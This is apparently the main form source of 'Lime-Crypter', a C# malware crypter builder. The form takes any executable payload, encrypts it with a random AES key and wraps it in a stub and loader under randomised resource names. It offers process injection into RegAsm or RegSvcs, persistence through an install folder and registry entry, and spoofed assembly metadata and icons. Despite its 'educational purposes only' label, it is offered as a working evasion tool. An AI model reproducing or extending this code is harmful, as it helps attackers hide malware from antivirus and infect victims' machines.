using Lime_Crypter.Util;
using Lime_Crypter.Build;
using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;


/*
 * │ Author       : NYAN CAT
 * │ Name         : Lime-Crypter
 * │ Contact      : https:github.com/NYAN-x-CAT
 * 
 * This program is distributed for educational purposes only.
 */


namespace Lime_Crypter.Forms
{
    public partial class Form1 : Form
    {
        private readonly FormInformation formInformation;
        private readonly FormChangeIcon formChangeIcon;
        private readonly RandomFileInfo randomFileInfo;
        private readonly RandomCharacters randomCharacters;
        private string currentInjection;
        public Form1()
        {
            this.formInformation = new FormInformation();
            this.formChangeIcon = new FormChangeIcon();
            this.randomCharacters = new RandomCharacters();
            this.randomFileInfo = new RandomFileInfo(randomCharacters);
            this.currentInjection = "RegAsm";
            InitializeComponent();
            SetupFoldername();
            Console.Beep();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Text = $"Lime Crypter";
        }

        //browser payload
        private void BtnPayloadBrowse_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    txtPayload.Text = openFileDialog.FileName;
                    btnBuild.Enabled = true;
                }
                else
                {
                    btnBuild.Enabled = false;
                }
            }
        }

        //open assembly information changer
        private void BtnInformation_Click(object sender, EventArgs e)
        {
            formInformation.ShowDialog();
        }

        //open icon changer
        private void BtnIcon_Click(object sender, EventArgs e)
        {
            formChangeIcon.ShowDialog();
        }

        //random
        private void BtnFillenameRandom_Click(object sender, EventArgs e)
        {
            var newInfo = randomFileInfo.getRandomFileInfo();
            txtFilename.Text = newInfo.Title.Replace(".exe", null);
        }

        //random
        private void BtnRegistrynameRandom_Click(object sender, EventArgs e)
        {
            var newInfo = randomFileInfo.getRandomFileInfo();
            txtRegistryname.Text = newInfo.Title.Replace(".exe", null);
        }

        //random
        private void BtnFoldernameRandom_Click(object sender, EventArgs e)
        {
            txtFoldername.SelectedIndex = new Random().Next(txtFoldername.Items.Count);
        }

        private void BtnSecondFolderRandom_Click(object sender, EventArgs e)
        {
            var newInfo = randomFileInfo.getRandomFileInfo();
            txtSecondFolder.Text = newInfo.Title.Replace(".exe", null);
        }

        // get all SpecialFolder
        private void SetupFoldername()
        {
            const string ApplicationDataFolder = "ApplicationData";
            foreach (var typeSpecialFolder in Enum.GetValues(typeof(Environment.SpecialFolder)))
            {
                txtFoldername.Items.Add(typeSpecialFolder);
                if (typeSpecialFolder.ToString() == ApplicationDataFolder)
                {
                    txtFoldername.Text = ApplicationDataFolder;
                }
            }
        }

        private async void BtnBuild_Click(object sender, EventArgs e)
        {
            using (var saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    SetupBuild setupBuild = new SetupBuild
                    {
                        PayloadName = txtPayload.Text, //payload
                        CommaLineIsChecked = checkBox1.Checked,
                        CommandLine = txtCmd.Text,
                        SaveFileName = saveFileDialog.FileName, //save path

                        //install
                        IsInstall = chkInstall.Checked,
                        FileName = txtFilename.Text,
                        FolderName = txtFoldername.Text,
                        SecondFolder = txtSecondFolder.Text,
                        RegistryName = txtRegistryname.Text,

                        InjectionName = currentInjection, //injection

                        //get texts from FormInformation
                        AssemblyTitle = formInformation.txtTitle.Text,
                        AssemblyDescription = formInformation.txtDescription.Text,
                        AssemblyProduct = formInformation.txtProduct.Text,
                        AssemblyCompany = formInformation.txtCompany.Text,
                        AssemblyCopyright = formInformation.txtCopyright.Text,
                        AssemblyTrademark = formInformation.txtTrademark.Text,
                        AssemblyMajorVersion = formInformation.assemblyMajorVersion.Value.ToString(),
                        AssemblyMinorVersion = formInformation.assemblyMinorVersion.Value.ToString(),
                        AssemblyBuildPart = formInformation.assemblyBuildPart.Value.ToString(),
                        AssemblyPrivatePart = formInformation.assemblyPrivatePart.Value.ToString(),

                        AssemblyIcon = formChangeIcon.txtIcon.Text, //icon path

                        Stub = Properties.Resources.Stub, //stub path
                        Loader = Properties.Resources.Loader,
                        TempDirectory = Path.Combine(Environment.CurrentDirectory, "temp"),
                        LoaderResourcesName = Path.GetRandomFileName().Replace(".", ""),
                        StubResourcesName = Path.GetRandomFileName().Replace(".", ""),
                        PayloadResources = Path.GetRandomFileName().Replace(".", ""),
                        StubLib = Path.GetRandomFileName().Replace(".", ""),
                        AesKey = Path.GetRandomFileName().Replace(".", ""),
                    };


                    StartBuilding(false); //turn everything off until we finish compiling
                    string result = string.Empty;

                    await Task.Run(() => //compile using codedom.

                    {
                        setupBuild.PrepareSource();
                        result = setupBuild.Compile(); //async
                    });

                    MessageBox.Show(result); //result of codeom
                    StartBuilding(true); //trun on
                }
            }
        }

        //turn off while compiling
        private void StartBuilding(bool status)
        {
            groupBox1.Enabled = status;
            if (chkInstall.Checked)
                groupBox2.Enabled = status;
            groupBox3.Enabled = status;
            groupBox4.Enabled = status;
            groupBox5.Enabled = status;
        }

        private void BtnRegasm_CheckedChanged(object sender, EventArgs e)
        {
            currentInjection = btnRegasm.Text;
        }

        private void BtnRegsvcs_CheckedChanged(object sender, EventArgs e)
        {
            currentInjection = btnRegsvcs.Text;
        }

        private void BtnItself_CheckedChanged(object sender, EventArgs e)
        {
            currentInjection = btnItself.Text;
        }

        private void ChkInstall_CheckedChanged(object sender, EventArgs e)
        {
            if (chkInstall.Checked)
            {
                groupBox2.Enabled = true;
            }
            else
            {
                groupBox2.Enabled = false;
            }
        }

        private void CheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
                txtCmd.Enabled = true;
            else
                txtCmd.Enabled = false;
        }
    }
}
